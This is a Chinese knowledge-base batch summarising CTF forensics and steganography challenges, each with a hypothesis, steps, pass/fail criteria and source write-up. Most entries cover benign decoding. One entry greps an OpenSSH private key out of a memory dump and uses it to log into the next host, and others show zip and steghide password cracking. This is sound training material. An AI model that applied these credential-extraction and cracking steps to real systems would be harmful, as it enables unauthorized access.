### gpjb 四格式文件头切分（gif/png/jpg/bmp 拼接流）
- **分层**：困难·单点
- **假设**：自造扩展名（.gpjb = gif/png/jpg/bmp 首字母）的文件实为海量小图按四格式头拼接的流；file 只识别第一个 gif 头；按 magic（GIF89a/\x89PNG/BM/\xFF\xD8\xFF\xE0）正则定位全部边界切分，每片即一个字符图——切分后人工誊写。
- **验证步骤**：1) file 确认首格式；2) python re.finditer 逐 magic 找全部起始偏移；3) 按偏移切分（片尾=下一头偏移）；4) 逐片查看誊写字符；5) 按题面格式插空格组 flag。
- **判定标准**：PASS = 誊写串过格式校验；FAIL = 有 bmp 头误报（BM 两字节过短，需长度阈值过滤）。
- **裁决词**：待复跑
- **来源**：SECCON 2015 Steganography 1 (100p)｜p4 (波兰战队)｜raw/github-repos/p4/2015_seccon_h_100.md
- **关联**：与 [[三图尾随 zip 拼接 + base 家族自动侦测套娃解码]]（本批）同属"多载体拼接"组；自造扩展名启发式与 [[剑龙隐写 pyc 切片 + 反编译异或 + 二次隐写]] 的"异常扩展名先查真实 magic"互证。
- **熵控预检**：Q1 无重名；Q3 强（切分脚本全在 WP）；Q4 边 2 条。

### 泄露截图 LSB 水印溯源（三通道 Plane0 + PK 嵌入）
- **分层**：困难·多段链
- **假设**：企业泄露溯源场景中，监控软件对截图打的"看不见的水印"常是 RGB 三通道 Plane 0 的 LSB 嵌入；StegSolve 逐面翻查顶缘异常→Data Extract (R0/G0/B0) Save Bin→预览见 PK 头→binwalk -eM 提取 flag.txt——"泄露甄别"叙事下的标准 LSB 取证。
- **验证步骤**：1) stegsolve 翻 Plane 0 三通道看顶部异常条带；2) Data Extract 勾 R0/G0/B0 位序 MSB；3) Save Bin 后 binwalk -eM；4) cat 提取目录内 flag.txt。
- **判定标准**：PASS = 提取出语义完整溯源标记；FAIL = 单通道（改勾 R0 only）或位序 LSB（翻转重提）。
- **裁决词**：待复跑
- **来源**：Cyber Cooperative CTF 2023 Funding Secured (200p/153 solved)｜Nightxade（github WP 仓）｜raw/github-repos/nightxade/_writeups/2023/Cyber-Cooperative-CTF-2023/forensics/funding-secured.md
- **关联**：泄露溯源叙事直连数据安全主线（与 recon 分区 [[数据脱敏四字段规则表（姓名/手机/身份证/银行卡/Email）]]、[[权限配置×操作日志双文件交叉违规检测（四违规码）]] 审计系列呼应）；LSB 三通道组提取与 [[BMP 头跳过 + 8 字节组 LSB 流提取（zsteg/StegSolve 全盲区）]]（本批）构成"工具可达 vs 工具盲区"对照。
- **熵控预检**：Q1 无重名；Q3 强（全流程命令在 WP）；Q4 边 2 条。

### DTMF 双音多频拨号音译码 + 十进制流多跳解码
- **分层**：困难·多段链
- **假设**：通话录音 wav 若为 DTMF 按键音（人耳可辨嘟嘟序列），频谱是双音叠加（低频组 697-941Hz + 高频组 1209-1477Hz）；在线 DTMF 检测器（unframework.github.io/dtmf-detect）转数字串→合并→十进制转十六进制→hex 转 ASCII 出 flag——音频侧信道三跳。
- **验证步骤**：1) 听音/频谱确认 DTMF 特征；2) dtmf-detect 上传逐键转数字；3) 数字串合并为十进制大数；4) 转十六进制；5) From_Hex 转 ASCII。
- **判定标准**：PASS = 末段 dsc{...} 语义完整；FAIL = 数字串需分段转 hex（整串溢出精度时按 2-3 位分组）。
- **裁决词**：待复跑
- **来源**：DeconstruCT.F 2023 Mastermind｜Nightxade（github WP 仓）｜raw/github-repos/daffainfo/2023_deconstruct-f_h_mastermind.md
- **关联**：DTMF 与 [[PT2262 无线信号波形译码（脉冲宽度三元映射）]]（本批）构成"模拟信号译码"双条（电话拨号 vs 无线遥控）；多跳编码收官与 [[三图尾随 zip 拼接 + base 家族自动侦测套娃解码]] 同构。
- **熵控预检**：Q1 无重名（库内无 DTMF 条目）；Q3 强（解码链全在 WP）；Q4 边 2 条。


### ADS-B 航空协议帧解密（pyModeS + tcp.payload 批量解帧）
- **分层**：困难·流程
- **假设**：纯 TCP 流量包中 46 hex 字符长的 payload 若为 ADS-B 航空器广播帧（Mode S），pyModeS.tell() 可逐帧解出 ICAO 地址/速度/呼号等字段；"找最快飞机"类问题即帧级属性排序——非 Web 协议审计的通用路径：识别协议→库解帧→属性聚合。
- **验证步骤**：1) tshark -r x.pcapng -T fields -e tcp.payload 导出（空行过滤）；2) 只留长度 46 的行；3) pyModeS.tell(item[18:46]) 批量解帧；4) 从 tell 输出筛速度字段取最大；5) ICAO 大写 + speed 拼接 MD5 提交。
- **判定标准**：PASS = 解帧输出含可读速度/ICAO 且 MD5 校验通过；FAIL = 帧切位错（调整 [18:46] 偏移）或协议为 ADS-B 之外（对照帧头 8D DF17 特征）。
- **裁决词**：待复跑
- **来源**：强网杯 2023 谍影重重2.0｜Lunatic（A1natas）｜raw/team-blogs/goodlunatic/2023_qwb_h_碟影重重2-0.md
- **关联**：与 [[NTLMv2 响应手工拆解（字段级 hash 形态）]] 同属"私有/专用协议字段级解析"；"GPT 识别协议→找解析库"的检索链是协议取证元方法。
- **熵控预检**：Q1 无重名（库内无航空协议条目）；Q3 强（tshark+pyModeS 脚本全在 WP）；Q4 边 2 条。

### 冰蝎流量 + 线性光栅图五重采样还原（z 五重切片采样）
- **分层**：困难·多段链
- **假设**：冰蝎 webshell 流量解出的 PNG 若人眼看是"乱纹"，可能是 N 重线性光栅（每 5 列取 1 列藏真图）；numpy 切片 z[:, i::5, :] 对 i=0..4 各渲染一张，其中一张即真图——光栅是"视觉不可见"的低成本实现。
- **验证步骤**：1) 冰蝎流量解密（库内既有条目）得 flag.png；2) np.array(Image.open) 读形状；3) for i in range(5): z[:, i::5, :] = img[:, i::5, :] 渲染五张；4) 逐张肉眼/OCR 识别。
- **判定标准**：PASS = 五采样中一张可读；FAIL = 步长非 5（尝试 4/6/8）或为行光栅（换 z[i::5, :, :]）。
- **裁决词**：待复跑
- **来源**：浙江省大学生网络与信息安全竞赛 2023 NewGrating（Byxs20 出题）｜Lunatic（A1natas）｜raw/team-blogs/goodlunatic/2023_ev_h_newgrating.md
- **关联**：光栅采样与 [[密码自递归嵌套 zip + RGB 像素流重绘二维码]]（本批）构成"像素重排还原"双型（规则采样 vs 数据重绘）；冰蝎入口与 [[冰蝎已知密钥流量解密 + des3 salt 容器 + emoji 拼音密文]]（库）接力。
- **熵控预检**：Q1 无重名；Q3 强（五采样脚本全文在 WP）；Q4 边 2 条。

### HTTP 对象导出 + zip 伪加密 + base64 隐写 + DES 四跳链
- **分层**：困难·多段链
- **假设**：HTTP 流量题的"导出对象→zip（注释给 key）→伪加密修复→base64 隐写提取→DES 解密"是完整攻击残留取证链；伪加密改两个加密位（0/1 标志）即解，base64 隐写用尾差提取器（PuzzleSolver/手写）出密文，注释里的 key 直接喂 DES。
- **验证步骤**：1) wireshark 导出 HTTP 对象筛 file.zip；2) 读 zip 注释抄 key；3) 010editor 翻转两个加密标志位；4) 解压得 base64 串，尾差提取隐写位得密文；5) DES-CBC 解密。
- **判定标准**：PASS = DES 输出 flag{...} 语义完整；FAIL = 隐写提取位序反（翻转重提）或 DES 模式差异（ECB/CBC 试）。
- **裁决词**：待复跑
- **来源**：长城杯 2024 pcap｜Lunatic（A1natas）｜raw/team-blogs/goodlunatic/2024_ev_h_pcap.md
- **关联**：与 [[Base64 非规范尾差隐写（重编码差值藏比特）]]（本批）共享尾差子环节（本条为链型应用，彼条为原理条）；伪加密修复与 [[hex 文本修复 JPEG + steghide 双层 + morse/ROT13]] 的"容器修复先行"同构。
- **熵控预检**：Q1 与尾差原理条已区分（链型 vs 原理）；Q3 强；Q4 边 3 条。

### Windows 计划任务描述字段藏匿（Base64 + HTML Entity 双编码）
- **分层**：困难·单点
- **假设**：应急响应中计划任务程序（taskschd.msc）的"描述"字段是常被忽视的藏匿点；内容 f^l^a^g^:JiM3ODs... 形态是"^"分隔的 Base64，解码后再过 HTML Entity（&#78;）双层即出 payload——Windows 工件审计清单项。
- **验证步骤**：1) 计划任务程序找异常任务（如 Driverupdates）；2) 复制描述字段；3) CyberChef From_Base64 + From_HTML_Entity；4) 读出明文。
- **判定标准**：PASS = 双层解码出语义完整 flag；FAIL = 分隔符非 ^（换行/空格变体）或编码序反（先 HTML 后 Base64）。
- **裁决词**：待复跑
- **来源**：CISCN 2025 CCB 初赛 WinFT_2｜Volcania 战队 bili33（公开 WP）｜raw/cn-events/ciscn/2025_ciscn_h_winft_2__bili33.md
- **关联**：计划任务藏匿与库内持久化条目（注册表/启动项）互补构成 Windows 持久化工件地图；"冷门字段藏 payload"与 [[EXIF Make 字段跨图序拼接（同字段跨文件 + zsteg 补刀）]] 的元数据思路互通。
- **熵控预检**：Q1 无重名；Q3 强（解码链命令在 WP）；Q4 边 2 条。


### 加密 zip 字典爆破 + Minix 文件系统取证 + PNG magic 篡改修复
- **分层**：困难·多段链
- **假设**：未知格式大文件（5MB "d"）若是 Minix filesystem（file 识别），挂载/解析后 strings 出 IHDR 说明内嵌 PNG 但 magic 被改（PNG→PUG）：对照标准 PNG 头逐字节修复即得桌面截图证据——"文件系统层→镜像层"双层取证。
- **验证步骤**：1) fcrackzip -D -p crackstation 字典爆破 zip（本例 tacos）；2) file 识 Minix V1；3) strings | grep IHDR 定位 PNG 偏移；4) vim/xxd 对照标准头改 PUG→PNG；5) 打开截图读 flag。
- **判定标准**：PASS = 修复后 PNG 可打开；FAIL = magic 多处篡改（全文件搜 PUG 逐个改）或分区需 mount -o loop。
- **裁决词**：待复跑
- **来源**：IceCTF 2018 Hard Shells (Forensics 200p)｜Writeup 仓（IceCTF 官方格式）｜raw/github-repos/shiltemann/2018_icectf_h_hard-shells.md
- **关联**：PNG magic 修复与 [[PNG 结构修复五重奏（CRC 爆破宽高 + IDAT 块名 + 7z→zip 头 + CRC ASCII + 片段全排列）]]（本批）构成修复层级对照（magic 级 vs 结构级）；Minix 冷门文件系统意识与 [[剑龙隐写 pyc 切片 + 反编译异或 + 二次隐写]] 的"file 优先"互证。
- **熵控预检**：Q1 无重名；Q3 强（全命令链在 WP）；Q4 边 2 条。

### Golly 元胞自动机 RLE 渲染（Game of Life B3/S23）
- **分层**：困难·单点
- **假设**：给出 "x=0,y=0,rule=B3/S23" 头的纯文本是 Golly 元胞自动机 RLE 格式；导入 golly 软件选 Life 规则渲染即出 flag 图——冷门仿真格式的"工具链识别→渲染"路径。
- **验证步骤**：1) 识别 RLE 特征头（rule=B3/S23 生命游戏）；2) 内容存 .rle；3) Golly File→Open 渲染；4) 缩放到合适尺度读图。
- **判定标准**：PASS = 渲染出可读字符；FAIL = 需运行 N 代演化后稳定成图（Play 后观察）或规则变体（按 rule 字段选对应规则集）。
- **裁决词**：待复跑
- **来源**：SunshineCTF 2019 Golly Gee Willikers (Forensics 100p)｜Writeup 仓｜raw/github-repos/Dvd848/2019_golly-gee-willikers-md_h_golly-gee-willikers.md
- **关联**："冷门格式→专用工具渲染"与 [[剑龙隐写 pyc 切片 + 反编译异或 + 二次隐写]]（本批）同型；RLE 压缩（obo/b3o 计数展开）可作编码分析域交叉例。
- **熵控预检**：Q1 无重名；Q3 中（格式与工具在 WP，渲染参数需试）；Q4 边 1 条。

### 内存 dump 无果时的 strings+URL grep 兜底路径
- **分层**：困难·流程
- **假设**：volatility pslist/filescan 均无收获的内存镜像，直接对 raw 全文 egrep URL（egrep -a --only-matching 'https?://\S+'（非空白可打印字符））常能捞到浏览器缓存中的云盘链接（dropbox/drive.google.com）；命中 xlsx 后按 zip 解压 grep 字符串表即出 flag——插件失败时的"原始字节检索"兜底。
- **验证步骤**：1) volatility imageinfo 定 profile；2) pslist/filescan 快扫确认无果；3) egrep -a -o URL 全量导出去重；4) 按可疑域（云盘/ pastebin）逐个访问；5) xlsx 解压 grep flag 特征串。
- **判定标准**：PASS = 云盘链接可达且含 flag；FAIL = 链接过期（转 Wayback）或 URL 被编码（先过 urldecode）。
- **裁决词**：待复跑
- **来源**：WhiteHat Grand Prix 2020 Quals Misc 04｜Writeup 仓（kevin_mitnick.1.raw）｜raw/github-repos/perfectblue/2020_whitehat-grandprix_h_misc04.md
- **关联**：与 [[内存 dump 中 SSH 凭据链提取（跳板机场景）]]（本批）构成内存取证双路径（结构化插件 vs 原始 grep）；xlsx=zip 解压 grep 与 [[xlsx 零宽字符文档水印溯源（MagicText XOR + 种子重放）]]（本批）的容器操作互通。
- **熵控预检**：Q1 无重名；Q3 强（全命令在 WP）；Q4 边 2 条。

### 多时区日志归一化排序还原（sonar 十六进制字符流）
- **分层**：困难·单点
- **假设**：日志条目附不同时区（America/St_Barthelemy 等）且时间字符串不可直接排序时，嵌在每行的 0xXX hex 字符须按统一时区（如 UTC）的真实时间戳排序才是 flag 正序——TreeMap<ZonedDateTime,Char> 一次遍历即还原；乱序 flag（首字符 F 不对位）是多时区陷阱的典型信号。
- **验证步骤**：1) grep -oE '0x.{2}' 抽全部 hex 字符；2) 解析每行时区串转 ZoneId；3) LocalDateTime.atZone(zone) 统一坐标；4) TreeMap 按时间排序收集字符；5) 拼接输出。
- **判定标准**：PASS = 输出以 F 开头格式完整的 flag；FAIL = 仍有乱序（检查夏令时/DST 处理，ZonedDateTime 自动含）。
- **裁决词**：待复跑
- **来源**：The Catch 2023 Sonar logs｜vernjan（cz.vernjan.ctf）｜raw/github-repos/vernjan/write-ups/TheCatch2023/02-crew-drills/01-sonar-logs/README.md
- **关联**：时区归一化是日志审计通用痛点，直接反哺数据安全审计域（与 [[超期账号未回收审计（ExpiryDate × Status 交叉）]] 的日期解析陷阱互证）；hex 字符流抽取与 [[SQL 盲注流量还原（二分阈值拐点法）]]（本批）同为"逐字符还原"型。
- **熵控预检**：Q1 无重名；Q3 强（Java 还原程序全文在 WP）；Q4 边 1 条。

### 内存 dump 中 SSH 凭据链提取（跳板机场景）
- **分层**：困难·多段链
- **假设**：攻击者跳板机的内存镜像中，bash history/进程参数含 "ssh user@ip" 连接串（strings+grep "ssh " 直捞），OpenSSH 私钥以 "BEGIN OPENSSH PRIVATE KEY-----" 明文块残留（grep -A 7 截取）；凭据+私钥可直接登录下一跳基础设施——内存取证的横向移动证据链。
- **验证步骤**：1) strings dump | grep "ssh " 找目标 IP/用户；2) grep -a -A 7 "BEGIN OPENSSH PRIVATE KEY" 提私钥存 id_rsa；3) chmod 600；4) ssh l33t@<ip> -i id_rsa 登录取 flag。
- **判定标准**：PASS = 私钥可登录下一跳；FAIL = 私钥截断（扩 -A 行数）或需 passphrase（回内存找口令）。
- **裁决词**：待复跑
- **来源**：NahamCon CTF 2023 Raided (Forensics)｜Nightxade（github WP 仓）｜raw/github-repos/daffainfo/2023_nahamcon-ctf_h_raided.md
- **关联**：与 [[内存 dump 无果时的 strings+URL grep 兜底路径]]（本批）构成内存双径；跳板场景与 [[Windows SAM bootKey 转储 + SilentEye 隐写双密钥链]]（库）的"一跳多证据"互链。同批 VU Cyberthon Blue Baby Shark（Dropbox LAN sync 作 C2 载体、follow stream 收 flag）与本条合并为"C2 通信取证"关联证据。
- **熵控预检**：Q1 无重名；Q3 强（strings/grep/ssh 命令链在 WP）；Q4 边 2 条。

### 盲注 != 逐字符还原 + bzip2 CRC 30bit 补全 + zip/RAR 头连环修复
- **分层**：困难·流程
- **假设**：GET 串盲注（!= 比较 comment AS CHAR 逐位）可用 chr(int(q.split('!=')[-1])) 逐请求还原整段 base64；修复链有三级：①补 = 去 . 修 base64；②bzip2 尾部 CRC 仅 30bit（2bit 爆破+6bit 补零）；③zip Local header 篡改按 PK 对照修、未知容器靠 RAR CMT 注释标识猜格式——"逐字符还原→格式规范级修复"的深水区取证。
- **验证步骤**：1) strings|grep GET 收集注入串；2) python 逐行抽 != 后数值转字符拼 b64；3) tr -d '.' + echo '=' 补齐解码；4) bzip2 CRC 按 spec 补位解压；5) 逐层 gunzip；6) 修 zip 头解压；7) CMT 标识确认 RAR 修头读注释。
- **判定标准**：PASS = 五级修复后读出 flag；FAIL = 中途校验失败（按各格式 spec 逐字段比对偏移）。
- **裁决词**：待复跑
- **来源**：SUCTF 2018 TNT（sasdf, bookgin 双人解）｜p4 (波兰战队)｜raw/github-repos/balsn/slices/20180526-suctf/tnt.md
- **关联**：盲注还原与 [[SQL 盲注流量还原（二分阈值拐点法）]]（本批）构成双算法（!=逐字符 vs 二分拐点）；格式连环修复与 [[PNG 结构修复五重奏（CRC 爆破宽高 + IDAT 块名 + 7z→zip 头 + CRC ASCII + 片段全排列）]]（本批）组成"深修谱系"；CMT 标识法是"无头容器识别"通用技巧。
- **熵控预检**：Q1 与盲注条目已区分（算法+修复链为增量）；Q3 强（脚本与 spec 引用在 WP）；Q4 边 4 条。


### EV3 蓝牙传感器流量四模式替换 + 网格重排成图
- **分层**：困难·多段链
- **假设**：pklg（LEGO EV3 蓝牙记录）经 tshark -e data 抽出的 hex 流，含四种传感器值特征（07002a00020000c040 型）替换为 0/1/2/3 后剩余数字即 120 列网格的灰度值；逐行定宽渲染成 ASCII/PNG 图即出二维码——"协议枚举值→像素"的冷门载体取证。
- **验证步骤**：1) tshark -r x.pklg -E separator=, -e data -T fields 抽 data 列；2) sed 四组值替换为 0-3；3) 定 120 宽逐行写网格；4) 数字映射灰度渲染 PNG；5) 扫码。
- **判定标准**：PASS = 图含可扫 QR；FAIL = 宽度不对（试 119/121）或值域有第五种（扩展替换表）。
- **裁决词**：待复跑
- **来源**：HITCON CTF 2018 EV3 Scanner｜Writeup 仓（MWR 风格）｜raw/github-repos/balsn/slices/20181019-hitconctf/ev3-scanner.md
- **关联**：网格重排成图与 [[Java 文字冒险静态数组提取 + 字符映射像素渲染]]（本批）同族（本条增量＝协议枚举先替换）；蓝牙载体与 [[PT2262 无线信号波形译码（脉冲宽度三元映射）]]（本批）同为物联网侧信道。
- **熵控预检**：Q1 无重名；Q3 强（tshark/sed 链在 WP）；Q4 边 2 条。

### 多段链：DOC=ZIP + stegseek 爆破 + GBK 注释 + 像素逆变换（中文题）
- **分层**：困难·多段链
- **假设**：中文杂项套娃链：DOC 实为 ZIP（改后缀解压得 JPG）+ RAR 注释提示 steghide（stegseek 字典秒爆）+ 爆出 txt 为 GBK 编码（010 显示乱码须记事本/CyberChef 转）+ 解压得 C 代码但注释里写着 Python 原码 + 逆变换 (r-10)/0.01 恢复像素得二维码——五跳链，每跳一坑（GBK 是中国赛特色坑）。
- **验证步骤**：1) file 识别 DOC→ZIP 改后缀；2) 解压 gogog/ 得 JPG；3) stegseek --crack jpg 字典爆破；4) GBK 转码读密码解 RAR；5) filename.c 注释里取 Python 加密脚本反写（(x-10)/0.01 逆变换）；6) 恢复 PNG 扫码。
- **判定标准**：PASS = 二维码可扫出 flag；FAIL = 逆变换溢出（clamp 0-255）或 RGBA 通道序错（对照 pix 解包顺序）。
- **裁决词**：待复跑
- **来源**：星球题集 2025 大威天龙（朋友投稿）｜Lunatic（A1natas）｜raw/team-blogs/goodlunatic/2025_xingqiu_h_大威天龙.md
- **关联**：steghide 爆破与 [[steghide 空口令隐写探测]]（库）构成空口令/字典爆破对照；GBK 转码坑与 [[PHP script 标签绕过正则删除上传（PHP5 历史限制）]]（本批 web）同属"本地化环境陷阱"；像素逆变换与 [[冰蝎流量 + 线性光栅图五重采样还原（z 五重切片采样）]]（本批）互链。
- **熵控预检**：Q1 与库内多段链条目区分（GBK+C 注释双坑为增量）；Q3 强（全链条与脚本在 WP）；Q4 边 3 条。

### PNG→PDF→…→7z 六层套娃容器（polyglot 逐层剥离）
- **分层**：困难·流程
- **假设**：pngcheck 报 IEND 后附加数据、binwalk --dd=".*" 层层见 PDF/zip/7z 的文件是 polyglot 套娃：每层用各自工具（binwalk/foremost/7z x）剥离一次，7z 层用 -t7z 显式类型解压，末层 docx（又是 zip）里 grep flag——17KB 长链样本，练"每层识别→剥壳"的耐心活。
- **验证步骤**：1) pngcheck 找 IEND 后数据；2) binwalk --dd=".*" 全量剥离；3) 逐层 file 识别+对应工具解压（pdf→7z→zip→docx）；4) 解包目录 strings/grep flag。
- **判定标准**：PASS = 末层命中 flag；FAIL = 中间层有伪魔数（对照 binwalk 十六进制偏移手工 dd）。
- **裁决词**：待复跑
- **来源**：TAMUctf 2019 I heard you like files (Misc 306p)｜Writeup 仓（17KB 长文）｜raw/github-repos/Dvd848/2019_i-heard-you-like-files-md_h_i-heard-you-like-files.md
- **关联**：套娃剥离与 [[密码自递归嵌套 zip + RGB 像素流重绘二维码]]（本批）同族（本条增量＝六层+7z/docx 冷门层）；"每层先识别再剥"纪律与 [[PDF 多层 binwalk 提取 + 解压炸弹规避（-1 尺寸伪文件）]]（本批）互证。
- **熵控预检**：Q1 与库内嵌套条目区分（六层深度+7z 层为增量）；Q3 强（逐层命令全在 WP）；Q4 边 2 条。


### 巨幅图像逐列/逐行循环偏移对齐（np.roll 绿像素锚点搜索）
- **分层**：困难·流程
- **假设**：6000x4000 大图若每列藏一段 80 像素绿色锚带（RGB 18,255,2）但位置错乱，对每列 np.roll 循环尝试 0..h 偏移直至锚带全部对齐顶部；列对齐后图变"每行 80 绿像素"错乱，同样方法行对齐即还原——"锚点对齐"两阶段，与光栅采样互补的像素重排机制。
- **验证步骤**：1) PS/取样器确认锚色 (18,255,2)；2) 逐列 roll 搜索使前 80 行全绿的偏移；3) 输出中间图再逐行 roll 搜索；4) 最终图读 DASCTF{...}。
- **判定标准**：PASS = 两阶段后出现可读字样；FAIL = 锚色有容差（±2 范围判定）或需先裁剪边框。
- **裁决词**：待复跑
- **来源**：天山固网 2025 数字雨（星球题集）｜Lunatic（A1natas）｜raw/team-blogs/goodlunatic/2025_天山固网_h_数字雨.md
- **关联**：与 [[冰蝎流量 + 线性光栅图五重采样还原（z 五重切片采样）]]（本批）构成像素重排双机制（roll 偏移 vs 切片采样）；引用 b01lers image_adjustments 同型题（选材留痕：跨题源互证）。
- **熵控预检**：Q1 无重名；Q3 强（两阶段完整脚本在 WP）；Q4 边 2 条。

### PNG Thumbnail Image 残留泄露（alpha 剪切后原图缩略还原）
- **分层**：简单·单点
- **假设**：PNG 被"alpha 剪刀"挖去关键区域后，若 exiftool 显示 Thumbnail Image : (Binary data 8609 bytes)，说明缩略图是剪切前生成的——exiftool -b -ThumbnailImage 提取即得完整未剪内容（OPSEC 真实事故同型：截图工具缩略图未清）。
- **验证步骤**：1) exiftool 全字段查 Thumbnail Image 条目；2) exiftool -b -ThumbnailImage x.png > thumb.jpg；3) 打开缩略图读被剪区域。
- **判定标准**：PASS = 缩略图含完整邀请码；FAIL = 无缩略图（转 alpha 通道/图层恢复路径）。
- **裁决词**：待复跑
- **来源**：Hackvent 2020 Day 01 Happy Hackvent｜Writeup 仓（IceCTF 官方格式）｜raw/github-repos/shiltemann/2020_hackvent_h_day-01-happy-hackvent-2020.md
- **关联**：与 [[AI 生图 PNG 元数据 Prompt/Negative Prompt 泄密]]、[[EXIF Make 字段跨图序拼接（同字段跨文件 + zsteg 补刀）]]（本批/库）构成元数据泄露三联（缩略图/生成参数/Make 字段）；"删内容不删元数据"是数据销毁合规的反面教材，直连数据安全域。
- **熵控预检**：Q1 无重名；Q3 强（exiftool 命令在 WP）；Q4 边 2 条。
